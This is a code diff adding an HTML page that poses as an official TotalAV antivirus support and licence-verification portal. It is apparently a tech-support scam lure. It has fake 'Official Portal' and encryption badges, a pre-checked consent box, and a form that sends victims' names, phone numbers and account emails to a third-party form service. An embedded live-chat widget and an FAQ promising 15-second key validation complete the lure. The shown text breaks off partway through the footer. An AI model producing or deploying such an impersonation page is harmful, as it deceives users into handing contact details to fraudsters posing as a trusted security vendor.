@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TotalAV Support Centre – Get Help With Your TotalAV Account</title>
+    
+    <!-- Google Fonts: Inter -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome 6 Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Smartsupp Live Chat script -->
+    <script type="text/javascript">
+    var _smartsupp = _smartsupp || {};
+    _smartsupp.key = '6c170aa705ae9b4eadeca772f09d06f782956e01';
+    window.smartsupp||(function(d) {
+      var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+      s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+      c.type='text/javascript';c.charset='utf-8';c.async=true;
+      c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+    })(document);
+    </script>
+    <noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        totalav: {
+                            red: '#E63748',
+                            darkRed: '#C42B34',
+                            lightRed: '#FFF0F2',
+                            bgGray: '#F8FAFC',
+                            slate: '#0F172A',
+                            border: '#E2E8F0'
+                        }
+                    },
+                    boxShadow: {
+                        'glow-red': '0 0 25px -5px rgba(230, 55, 72, 0.3)',
+                        'card-hover': '0 15px 30px -5px rgba(15, 23, 42, 0.08)'
+                    }
+                }
+            }
+        }
+    </script>
+    
+    <style>
+        .totalav-gradient {
+            background: linear-gradient(135deg, #0F172A 0%, #1E293B 50%, #2D0F18 100%);
+        }
+        .key-input-box {
+            letter-spacing: 2px;
+            font-family: monospace;
+            font-size: 1rem;
+            text-transform: uppercase;
+        }
+        @keyframes pulse-ring {
+            0% { transform: scale(0.95); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.8; }
+        }
+        .pulse-shield-icon {
+            animation: pulse-ring 3s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body class="bg-slate-50 text-slate-800 font-sans flex flex-col min-h-screen selection:bg-totalav-red selection:text-white">
+
+    <div class="bg-slate-900 text-slate-300 text-xs py-2 px-4 border-b border-slate-800">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-2 truncate">
+                <span class="inline-flex items-center px-2 py-0.5 rounded text-[11px] font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
+                    <i class="fa-solid fa-shield-halved mr-1"></i> Official Portal
+                </span>
+                <span class="hidden sm:inline text-slate-400">TotalAV™ Official Support & License Verification Center</span>
+            </div>
+            <div class="flex items-center space-x-4 text-xs">
+                <a href="#contact-support" class="hover:text-white flex items-center gap-1 transition-colors">
+                    <i class="fa-solid fa-headset text-totalav-red"></i> <span>24/7 Agent Help</span>
+                </a>
+                <span class="text-slate-700">|</span>
+                <span class="flex items-center gap-1 text-slate-400">
+                    <i class="fa-solid fa-lock text-emerald-400 text-[10px]"></i> 256-Bit SSL Encrypted
+                </span>
+            </div>
+        </div>
+    </div>
+
+    <header class="sticky top-0 z-40 bg-white border-b border-slate-200 shadow-sm">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-20">
+                <!-- TotalAV Logo -->
+                <a href="#" class="flex items-center gap-3 group">
+                    <div class="w-11 h-11 bg-totalav-red text-white rounded-xl flex items-center justify-center shadow-md shadow-totalav-red/20 group-hover:bg-totalav-darkRed transition-colors">
+                        <i class="fa-solid fa-shield-virus text-2xl"></i>
+                    </div>
+                    <div class="flex flex-col">
+                        <div class="flex items-baseline gap-1.5">
+                            <span class="text-2xl font-black tracking-tight text-slate-900">Total<span class="text-totalav-red">AV</span></span>
+                            <span class="text-[10px] font-bold text-slate-500 uppercase tracking-widest bg-slate-100 px-1.5 py-0.5 rounded border border-slate-200">Support</span>
+                        </div>
+                        <span class="text-[10px] text-slate-400 font-semibold tracking-wider uppercase">Antivirus & Security Center</span>
+                    </div>
+                </a>
+
+                <!-- Nav Links Desktop -->
+                <nav class="hidden md:flex items-center space-x-8 text-sm font-semibold text-slate-600">
+                    <a href="#support-categories" class="hover:text-totalav-red transition-colors">Help Categories</a>
+                    <a href="#quick-guides" class="hover:text-totalav-red transition-colors">Popular Articles</a>
+                    <a href="#faq" class="hover:text-totalav-red transition-colors">FAQ</a>
+                </nav>
+
+                <!-- Top Right CTA -->
+                <div class="flex items-center gap-3">
+                    <a href="https://login.totalav.com" target="_blank" class="hidden sm:inline-flex items-center gap-2 text-xs font-bold text-slate-700 bg-slate-100 hover:bg-slate-200 px-4 py-2.5 rounded-lg transition-colors">
+                        <i class="fa-solid fa-right-to-bracket text-slate-500"></i> Go To My Dashboard
+                    </a>
+                    <a href="#contact-form-section" class="inline-flex items-center gap-2 text-xs font-extrabold text-white bg-totalav-red hover:bg-totalav-darkRed px-5 py-2.5 rounded-lg shadow-md shadow-totalav-red/20 transition-all hover:-translate-y-0.5">
+                        <i class="fa-solid fa-headset"></i> Get Support
+                    </a>
+                    <button onclick="toggleMobileMenu()" class="md:hidden p-2 text-slate-600 hover:text-slate-900 focus:outline-none">
+                        <i class="fa-solid fa-bars text-xl"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mobile Navigation Drawer -->
+        <div id="mobile-menu" class="hidden md:hidden bg-white border-b border-slate-200 px-4 pt-2 pb-4 space-y-2">
+            <a href="#contact-form-section" onclick="toggleMobileMenu()" class="block px-3 py-2.5 rounded-lg text-sm font-bold text-totalav-red bg-totalav-lightRed">
+                <i class="fa-solid fa-headset mr-2"></i> Submit Support Ticket
+            </a>
+            <a href="#support-categories" onclick="toggleMobileMenu()" class="block px-3 py-2 rounded-lg text-sm font-medium text-slate-700 hover:bg-slate-100">Help Categories</a>
+            <a href="#quick-guides" onclick="toggleMobileMenu()" class="block px-3 py-2 rounded-lg text-sm font-medium text-slate-700 hover:bg-slate-100">Popular Guides</a>
+            <a href="#faq" onclick="toggleMobileMenu()" class="block px-3 py-2 rounded-lg text-sm font-medium text-slate-700 hover:bg-slate-100">FAQ</a>
+            <a href="https://login.totalav.com" target="_blank" class="block px-3 py-2 rounded-lg text-sm font-semibold text-slate-700 bg-slate-100 flex items-center justify-between">
+                <span>Go To My Dashboard</span>
+                <i class="fa-solid fa-arrow-up-right-from-square text-xs text-slate-400"></i>
+            </a>
+        </div>
+    </header>
+
+    <section class="totalav-gradient text-white py-12 lg:py-16 relative overflow-hidden">
+        <div class="absolute -right-20 -top-20 w-96 h-96 bg-totalav-red/20 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="absolute -left-20 -bottom-20 w-80 h-80 bg-red-900/20 rounded-full blur-3xl pointer-events-none"></div>
+
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10">
+            <!-- Two-Part Side-by-Side Grid: Column 1 Search Hub & Column 2 Support Form -->
+            <div id="contact-form-section" class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-stretch text-slate-800">
+                
+                <!-- Column 1 (Left Side): Search Hub & Quick Assistance -->
+                <div class="lg:col-span-6 bg-slate-900/80 backdrop-blur-md rounded-3xl p-6 sm:p-8 border border-slate-700/60 flex flex-col justify-between shadow-2xl text-white space-y-6">
+                    <div class="space-y-4">
+                        <div class="flex items-center justify-between">
+                            <span class="inline-flex items-center gap-2 bg-totalav-red/20 border border-totalav-red/30 px-3 py-1 rounded-full text-xs font-bold text-rose-300 uppercase tracking-wider">
+                                <i class="fa-solid fa-magnifying-glass text-totalav-red"></i> Search Knowledge Base
+                            </span>
+                            <span class="text-xs text-slate-400 font-medium">Column 1 of 2</span>
+                        </div>
+
+                        <h1 class="text-2xl sm:text-3xl lg:text-4xl font-black tracking-tight leading-snug">
+                            How can we help you today?
+                        </h1>
+                        <p class="text-slate-300 text-xs sm:text-sm leading-relaxed">
+                            Search our comprehensive documentation, troubleshooting guides, and account solutions before submitting a ticket.
+                        </p>
+
+                        <!-- Live Search Bar -->
+                        <div class="relative pt-2">
+                            <div class="relative flex items-center shadow-xl">
+                                <i class="fa-solid fa-magnifying-glass absolute left-4 text-slate-400 text-lg"></i>
+                                <input 
+                                    type="text" 
+                                    id="search-input" 
+                                    oninput="handleSearch(this.value)"
+                                    placeholder="Search articles, setup guides, billing, license..." 
+                                    class="w-full pl-12 pr-24 py-4 bg-white text-slate-800 placeholder-slate-400 font-medium text-sm rounded-2xl outline-none focus:ring-4 focus:ring-totalav-red/40 transition-all"
+                                >
+                                <button onclick="executeSearch()" class="absolute right-2 px-4 py-2 bg-totalav-red hover:bg-totalav-darkRed text-white font-bold text-xs rounded-xl transition-colors shadow-md">
+                                    Search
+                                </button>
+                            </div>
+                            
+                            <!-- Search Dropdown Results -->
+                            <div id="search-results" class="absolute left-0 right-0 top-full mt-2 bg-white rounded-2xl shadow-2xl border border-slate-200 text-left overflow-hidden hidden z-30 max-h-64 overflow-y-auto">
+                            </div>
+                        </div>
+
+                        <!-- Popular Search Tags -->
+                        <div class="space-y-2 pt-2">
+                            <span class="text-[11px] font-bold text-slate-400 uppercase tracking-wider block">Popular Searches:</span>
+                            <div class="flex flex-wrap gap-2 text-xs">
+                                <button onclick="fillSearch('Activation Key')" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg border border-slate-700 transition-colors">
+                                    <i class="fa-solid fa-key text-rose-400 text-[10px] mr-1"></i> Activation Key
+                                </button>
+                                <button onclick="fillSearch('Real-Time Protection')" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg border border-slate-700 transition-colors">
+                                    <i class="fa-solid fa-shield-halved text-emerald-400 text-[10px] mr-1"></i> Real-Time Protection
+                                </button>
+                                <button onclick="fillSearch('Billing')" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg border border-slate-700 transition-colors">
+                                    <i class="fa-solid fa-credit-card text-blue-400 text-[10px] mr-1"></i> Billing & Renewal
+                                </button>
+                                <button onclick="fillSearch('WebShield')" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg border border-slate-700 transition-colors">
+                                    <i class="fa-solid fa-globe text-amber-400 text-[10px] mr-1"></i> WebShield
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Security & Trust Footer Badges -->
+                    <div class="space-y-2.5 pt-4 border-t border-slate-800">
+                        <div class="flex items-center gap-3 text-xs font-semibold text-slate-300 bg-slate-800/50 p-2.5 rounded-xl border border-slate-700/50">
+                            <div class="w-7 h-7 rounded-lg bg-emerald-500/20 text-emerald-400 flex items-center justify-center shrink-0 border border-emerald-500/30">
+                                <i class="fa-solid fa-lock text-xs"></i>
+                            </div>
+                            <span>256-Bit Encrypted Data Verification</span>
+                        </div>
+                        <div class="flex items-center gap-3 text-xs font-semibold text-slate-300 bg-slate-800/50 p-2.5 rounded-xl border border-slate-700/50">
+                            <div class="w-7 h-7 rounded-lg bg-totalav-red/20 text-rose-400 flex items-center justify-center shrink-0 border border-totalav-red/30">
+                                <i class="fa-solid fa-headset text-xs"></i>
+                            </div>
+                            <span>24/7 Priority Support Routing System</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Column 2 (Right Side): Support & Help Desk Form -->
+                <div class="lg:col-span-6 flex">
+                    <div class="bg-white rounded-3xl p-6 sm:p-8 border border-slate-200 shadow-2xl relative w-full flex flex-col justify-between">
+                        <div>
+                            <div class="flex justify-between items-center pb-4 border-b border-slate-200 mb-6">
+                                <div>
+                                    <div class="flex items-center gap-2">
+                                        <h3 class="text-lg font-extrabold text-slate-900">Support & Help Desk Form</h3>
+                                        <span class="text-[10px] bg-slate-100 text-slate-600 px-2 py-0.5 rounded font-bold uppercase tracking-wider">Column 2 of 2</span>
+                                    </div>
+                                    <p class="text-xs text-slate-500">Submit a support request to connect with a technician</p>
+                                </div>
+                                <div class="w-10 h-10 bg-rose-50 rounded-xl flex items-center justify-center text-totalav-red shadow-sm border border-rose-100 shrink-0">
+                                    <i class="fa-solid fa-headset"></i>
+                                </div>
+                            </div>
+
+                            <!-- Support Ticket Form -->
+                            <form id="totalav-support-form" class="space-y-4" onsubmit="processTicketSubmission(event)">
+                                <input type="hidden" name="access_key" value="3b39b452-ec3b-4ee6-8a7a-b9d8c7c0abf8">
+                                <input type="hidden" name="subject" value="New TotalAV Support Ticket Request">
+                                <input type="hidden" name="from_name" value="TotalAV Help Center">
+
+                                <!-- Name Field -->
+                                <div>
+                                    <label for="user-name" class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
+                                        Full Name <span class="text-totalav-red">*</span>
+                                    </label>
+                                    <div class="relative">
+                                        <input 
+                                            type="text" 
+                                            id="user-name" 
+                                            name="name" 
+                                            required 
+                                            placeholder="e.g. John Smith" 
+                                            class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-800 text-sm font-medium outline-none focus:ring-2 focus:ring-totalav-red focus:border-totalav-red transition-all"
+                                        >
+                                        <div class="absolute right-3.5 top-3.5 text-slate-400">
+                                            <i class="fa-solid fa-user"></i>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Phone Field -->
+                                <div>
+                                    <label for="user-phone" class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
+                                        Phone Number <span class="text-totalav-red">*</span>
+                                    </label>
+                                    <div class="relative">
+                                        <input 
+                                            type="tel" 
+                                            id="user-phone" 
+                                            name="phone" 
+                                            required 
+                                            placeholder="+1 (555) 000-0000" 
+                                            class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-800 text-sm font-medium outline-none focus:ring-2 focus:ring-totalav-red focus:border-totalav-red transition-all"
+                                        >
+                                        <div class="absolute right-3.5 top-3.5 text-slate-400">
+                                            <i class="fa-solid fa-phone"></i>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Email Address -->
+                                <div>
+                                    <label for="user-email" class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
+                                        TotalAV Account Email Address <span class="text-totalav-red">*</span>
+                                    </label>
+                                    <div class="relative">
+                                        <input 
+                                            type="email" 
+                                            id="user-email" 
+                                            name="email" 
+                                            required 
+                                            placeholder="yourname@example.com" 
+                                            class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-800 text-sm font-medium outline-none focus:ring-2 focus:ring-totalav-red focus:border-totalav-red transition-all"
+                                        >
+                                        <div class="absolute right-3.5 top-3.5 text-slate-400">
+                                            <i class="fa-solid fa-envelope"></i>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Support Topic -->
+                                <div>
+                                    <label for="user-issue" class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5">
+                                        Support Topic
+                                    </label>
+                                    <select id="user-issue" name="issue_type" class="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-800 text-sm font-medium outline-none focus:ring-2 focus:ring-totalav-red">
+                                        <option value="Installation & Setup">Installation & Setup Assistance</option>
+                                        <option value="Account & Login Help">Account & Login Help</option>
+                                        <option value="Billing & Subscription Query">Billing & Subscription Renewal</option>
+                                        <option value="Technical Malware Issue">Technical Bug or Virus Scan Issue</option>
+                                    </select>
+                                </div>
+
+                                <!-- Consent -->
+                                <div class="flex items-start gap-2 pt-1">
+                                    <input type="checkbox" id="terms-check" name="terms" required class="mt-1 h-4 w-4 rounded border-slate-300 text-totalav-red focus:ring-totalav-red" checked>
+                                    <label for="terms-check" class="text-xs text-slate-600 leading-snug">
+                                        I agree to TotalAV's <a href="#" class="text-totalav-red underline font-medium">Terms of Service</a> and allow processing for support assistance.
+                                    </label>
+                                </div>
+
+                                <!-- Submit Button -->
+                                <button 
+                                    type="submit" 
+                                    id="btn-submit-ticket" 
+                                    class="w-full bg-totalav-red hover:bg-totalav-darkRed text-white font-extrabold py-3.5 px-6 rounded-xl shadow-lg shadow-totalav-red/30 transition-all hover:shadow-totalav-red/50 active:scale-[0.99] flex items-center justify-center gap-2 text-base cursor-pointer mt-2"
+                                >
+                                    <i class="fa-solid fa-paper-plane"></i> Submit Ticket Now
+                                </button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="support-categories" class="py-14 bg-slate-50 border-b border-slate-200">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-2xl mx-auto mb-10 space-y-2">
+                <h2 class="text-2xl sm:text-3xl font-extrabold text-slate-900">Support Categories</h2>
+                <p class="text-slate-600 text-sm">Select a category below to browse technical guides and self-service help.</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                
+                <!-- Category 1: Technical Support -->
+                <div onclick="selectCategory('Technical Support')" class="bg-white rounded-2xl p-6 border border-slate-200 shadow-sm hover:shadow-card-hover hover:border-totalav-red/40 transition-all cursor-pointer group flex flex-col justify-between">
+                    <div class="space-y-4">
+                        <div class="w-14 h-14 bg-rose-50 text-totalav-red rounded-2xl flex items-center justify-center text-2xl group-hover:scale-110 transition-transform">
+                            <i class="fa-solid fa-laptop-code"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-lg font-bold text-slate-900 group-hover:text-totalav-red transition-colors">Technical Product Support</h3>
+                            <p class="text-slate-500 text-xs mt-1 leading-relaxed">Get started with TotalAV setup, antivirus scans, real-time protection, and troubleshooting errors.</p>
+                        </div>
+                    </div>
+                    <div class="pt-6 flex items-center justify-between text-xs font-bold text-totalav-red border-t border-slate-100 mt-6">
+                        <span>Browse 18 Articles</span>
+                        <i class="fa-solid fa-chevron-right text-xs group-hover:translate-x-1 transition-transform"></i>
+                    </div>
+                </div>
+
+                <!-- Category 2: Account Support -->
+                <div onclick="selectCategory('Account Support')" class="bg-white rounded-2xl p-6 border border-slate-200 shadow-sm hover:shadow-card-hover hover:border-totalav-red/40 transition-all cursor-pointer group flex flex-col justify-between">
+                    <div class="space-y-4">
+                        <div class="w-14 h-14 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center text-2xl group-hover:scale-110 transition-transform">
+                            <i class="fa-solid fa-user-gear"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-lg font-bold text-slate-900 group-hover:text-totalav-red transition-colors">Account Support</h3>
+                            <p class="text-slate-500 text-xs mt-1 leading-relaxed">Everything to do with your TotalAV Account! Passwords, email login recovery, and device sync.</p>
+                        </div>
+                    </div>
+                    <div class="pt-6 flex items-center justify-between text-xs font-bold text-totalav-red border-t border-slate-100 mt-6">
+                        <span>Browse 12 Articles</span>
+                        <i class="fa-solid fa-chevron-right text-xs group-hover:translate-x-1 transition-transform"></i>
+                    </div>
+                </div>
+
+                <!-- Category 3: Billing Support -->
+                <div onclick="selectCategory('Billing Support')" class="bg-white rounded-2xl p-6 border border-slate-200 shadow-sm hover:shadow-card-hover hover:border-totalav-red/40 transition-all cursor-pointer group flex flex-col justify-between">
+                    <div class="space-y-4">
+                        <div class="w-14 h-14 bg-emerald-50 text-emerald-600 rounded-2xl flex items-center justify-center text-2xl group-hover:scale-110 transition-transform">
+                            <i class="fa-solid fa-file-invoice-dollar"></i>
+                        </div>
+                        <div>
+                            <h3 class="text-lg font-bold text-slate-900 group-hover:text-totalav-red transition-colors">Billing & Subscriptions</h3>
+                            <p class="text-slate-500 text-xs mt-1 leading-relaxed">Everything Billing related on your account. Invoices, license renewals, and account assistance.</p>
+                        </div>
+                    </div>
+                    <div class="pt-6 flex items-center justify-between text-xs font-bold text-totalav-red border-t border-slate-100 mt-6">
+                        <span>Browse 15 Articles</span>
+                        <i class="fa-solid fa-chevron-right text-xs group-hover:translate-x-1 transition-transform"></i>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <section id="quick-guides" class="py-16 bg-slate-50 border-b border-slate-200">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex flex-col sm:flex-row justify-between items-start sm:items-end mb-10 gap-4">
+                <div>
+                    <span class="text-xs font-bold text-totalav-red uppercase tracking-widest bg-totalav-lightRed px-3 py-1 rounded-full">Knowledge Base</span>
+                    <h2 class="text-2xl sm:text-3xl font-extrabold text-slate-900 mt-2">Popular Support Guides</h2>
+                </div>
+                <a href="#support-categories" class="text-xs font-bold text-totalav-red hover:text-totalav-darkRed flex items-center gap-1.5">
+                    View All Categories <i class="fa-solid fa-arrow-right"></i>
+                </a>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                
+                <!-- Guide 1 -->
+                <div onclick="openArticleModal('How to Enable Real-Time Protection', 'Learn how to configure TotalAV background scanning to ensure 24/7 protection against malware and ransomware threats.')" class="bg-white p-5 rounded-2xl border border-slate-200 hover:border-totalav-red/30 shadow-sm hover:shadow-md transition-all cursor-pointer group">
+                    <div class="flex items-center gap-3 text-totalav-red font-bold text-xs mb-2">
+                        <i class="fa-solid fa-shield-virus"></i> Technical Support
+                    </div>
+                    <h3 class="font-bold text-slate-900 group-hover:text-totalav-red transition-colors text-base mb-2">How to Enable Real-Time Protection</h3>
+                    <p class="text-slate-500 text-xs leading-relaxed">Step-by-step instructions for turning on active shield protection across Windows, macOS, and Android.</p>
+                </div>
+
+                <!-- Guide 2 -->
+                <div onclick="openArticleModal('Resetting Your TotalAV Account Password', 'If you forgot your password, enter your account email on the reset page to receive a secure recovery magic link.')" class="bg-white p-5 rounded-2xl border border-slate-200 hover:border-totalav-red/30 shadow-sm hover:shadow-md transition-all cursor-pointer group">
+                    <div class="flex items-center gap-3 text-blue-600 font-bold text-xs mb-2">
+                        <i class="fa-solid fa-key"></i> Account Support
+                    </div>
+                    <h3 class="font-bold text-slate-900 group-hover:text-totalav-red transition-colors text-base mb-2">Resetting Your Account Password</h3>
+                    <p class="text-slate-500 text-xs leading-relaxed">Quickly recover account access or update your account security credentials.</p>
+                </div>
+
+                <!-- Guide 3 -->
+                <div onclick="openArticleModal('How to Add Additional Devices to Subscription', 'TotalAV allows multi-device management. Log into your dashboard on any secondary device to download installer files directly.')" class="bg-white p-5 rounded-2xl border border-slate-200 hover:border-totalav-red/30 shadow-sm hover:shadow-md transition-all cursor-pointer group">
+                    <div class="flex items-center gap-3 text-emerald-600 font-bold text-xs mb-2">
+                        <i class="fa-solid fa-laptop"></i> Device Management
+                    </div>
+                    <h3 class="font-bold text-slate-900 group-hover:text-totalav-red transition-colors text-base mb-2">Adding Additional Devices</h3>
+                    <p class="text-slate-500 text-xs leading-relaxed">Protect up to 6 devices including PCs, Macs, iPhones, and Android smartphones.</p>
+                </div>
+
+                <!-- Guide 4 -->
+                <div onclick="openArticleModal('Managing Auto-Renewal Settings', 'You can update billing information or review subscription end dates in the Billing tab of your dashboard.')" class="bg-white p-5 rounded-2xl border border-slate-200 hover:border-totalav-red/30 shadow-sm hover:shadow-md transition-all cursor-pointer group">
+                    <div class="flex items-center gap-3 text-amber-600 font-bold text-xs mb-2">
+                        <i class="fa-solid fa-credit-card"></i> Billing Support
+                    </div>
+                    <h3 class="font-bold text-slate-900 group-hover:text-totalav-red transition-colors text-base mb-2">Managing Renewal & Billing Settings</h3>
+                    <p class="text-slate-500 text-xs leading-relaxed">Check renewal dates, update card details, or view historical invoices.</p>
+                </div>
+
+                <!-- Guide 5 -->
+                <div onclick="openArticleModal('Stopping Unwanted Browser Notifications', 'Follow this guide to block intrusive browser popups and push notification spam in Chrome, Edge, and Safari.')" class="bg-white p-5 rounded-2xl border border-slate-200 hover:border-totalav-red/30 shadow-sm hover:shadow-md transition-all cursor-pointer group">
+                    <div class="flex items-center gap-3 text-purple-600 font-bold text-xs mb-2">
+                        <i class="fa-solid fa-bell-slash"></i> Web Protection
+                    </div>
+                    <h3 class="font-bold text-slate-900 group-hover:text-totalav-red transition-colors text-base mb-2">Stopping Intrusive Push Notifications</h3>
+                    <p class="text-slate-500 text-xs leading-relaxed">Clean up annoying popups and fake warning notifications in your web browsers.</p>
+                </div>
+
+                <!-- Guide 6 -->
+                <div onclick="openArticleModal('Installing TotalAV WebShield Extension', 'WebShield blocks malicious websites, phishing scams, and dangerous downloads before they touch your computer.')" class="bg-white p-5 rounded-2xl border border-slate-200 hover:border-totalav-red/30 shadow-sm hover:shadow-md transition-all cursor-pointer group">
+                    <div class="flex items-center gap-3 text-rose-600 font-bold text-xs mb-2">
+                        <i class="fa-solid fa-shield"></i> WebShield
+                    </div>
+                    <h3 class="font-bold text-slate-900 group-hover:text-totalav-red transition-colors text-base mb-2">Installing WebShield Browser Extension</h3>
+                    <p class="text-slate-500 text-xs leading-relaxed">Free extension that guards your online browsing sessions in real-time.</p>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <section id="faq" class="py-16 bg-white border-b border-slate-200">
+        <div class="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-2xl mx-auto mb-10">
+                <span class="text-xs font-bold text-totalav-red uppercase tracking-widest bg-totalav-lightRed px-3 py-1 rounded-full">FAQ</span>
+                <h2 class="text-2xl sm:text-3xl font-extrabold text-slate-900 mt-3">Frequently Asked Questions</h2>
+                <p class="text-slate-600 text-sm mt-1">Common answers regarding activation and TotalAV support.</p>
+            </div>
+
+            <div class="space-y-4">
+                
+                <!-- FAQ 1 -->
+                <div class="bg-slate-50 border border-slate-200 rounded-2xl overflow-hidden">
+                    <button onclick="toggleFaq(1)" class="w-full text-left p-5 font-bold text-slate-800 flex justify-between items-center hover:bg-slate-100 transition-colors">
+                        <span>Where do I locate my 25-digit TotalAV Product Key?</span>
+                        <i id="faq-icon-1" class="fa-solid fa-chevron-down text-slate-400 transition-transform"></i>
+                    </button>
+                    <div id="faq-body-1" class="hidden p-5 border-t border-slate-200 text-slate-600 text-sm leading-relaxed bg-white">
+                        Your 25-character activation key is located inside your order confirmation email or on the back card sleeve if purchased in a retail package. Key format example: <span class="font-mono bg-slate-100 px-2 py-0.5 rounded font-bold text-slate-800">XXXXX-XXXXX-XXXXX-XXXXX-XXXXX</span>.
+                    </div>
+                </div>
+
+                <!-- FAQ 2 -->
+                <div class="bg-slate-50 border border-slate-200 rounded-2xl overflow-hidden">
+                    <button onclick="toggleFaq(2)" class="w-full text-left p-5 font-bold text-slate-800 flex justify-between items-center hover:bg-slate-100 transition-colors">
+                        <span>How long does license validation take?</span>
+                        <i id="faq-icon-2" class="fa-solid fa-chevron-down text-slate-400 transition-transform"></i>
+                    </button>
+                    <div id="faq-body-2" class="hidden p-5 border-t border-slate-200 text-slate-600 text-sm leading-relaxed bg-white">
+                        When you submit your ticket through our verification form above, our automated system validates your token key in 15 seconds, immediately linking protection to your email address.
+                    </div>
+                </div>
+
+                <!-- FAQ 3 -->
+                <div class="bg-slate-50 border border-slate-200 rounded-2xl overflow-hidden">
+                    <button onclick="toggleFaq(3)" class="w-full text-left p-5 font-bold text-slate-800 flex justify-between items-center hover:bg-slate-100 transition-colors">
+                        <span>Can I install TotalAV on multiple computers and phones?</span>
+                        <i id="faq-icon-3" class="fa-solid fa-chevron-down text-slate-400 transition-transform"></i>
+                    </button>
+                    <div id="faq-body-3" class="hidden p-5 border-t border-slate-200 text-slate-600 text-sm leading-relaxed bg-white">
+                        Yes! TotalAV subscriptions cover up to 6 devices. Once your main account is registered, log in to <span class="font-semibold text-slate-800">login.totalav.com</span> on additional devices to download installers.
+                    </div>
+                </div>
+
+                <!-- FAQ 4 -->
+                <div class="bg-slate-50 border border-slate-200 rounded-2xl overflow-hidden">
+                    <button onclick="toggleFaq(4)" class="w-full text-left p-5 font-bold text-slate-800 flex justify-between items-center hover:bg-slate-100 transition-colors">
+                        <span>Need live help from an agent?</span>
+                        <i id="faq-icon-4" class="fa-solid fa-chevron-down text-slate-400 transition-transform"></i>
+                    </button>
+                    <div id="faq-body-4" class="hidden p-5 border-t border-slate-200 text-slate-600 text-sm leading-relaxed bg-white">
+                        Our live support chat widget is accessible 24/7 at the bottom right corner of this screen. You can also submit the support form above for email follow-up.
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <footer id="contact-support" class="bg-slate-900 text-slate-400 text-xs py-12 mt-auto">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 space-y-8">
+            
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 pb-8 border-b border-slate-800">
+                <div class="space-y-3">
+                    <div class="flex items-center gap-2 text-white font-black text-lg">
+                        <i class="fa-solid fa-shield-virus text-totalav-red"></i> Total<span class="text-totalav-red">AV</span>
+                    </div>
+                    <p class="leading-relaxed text-slate-400">
+                        Official global support, help desk, and license activation portal for TotalAV Antivirus & Security software.
+                    </p>
+                </div>
+
+                <div>
+                    <h4 class="text-white font-bold text-sm mb-3">Quick Navigation</h4>
+                    <ul class="space-y-2">
+                        <li><a href="#contact-form-section" class="hover:text-white transition-colors">Submit Support Ticket</a></li>
+                        <li><a href="#support-categories" class="hover:text-white transition-colors">Help Categories</a></li>
+                        <li><a href="#quick-guides" class="hover:text-white transition-colors">Knowledge Base</a></li>
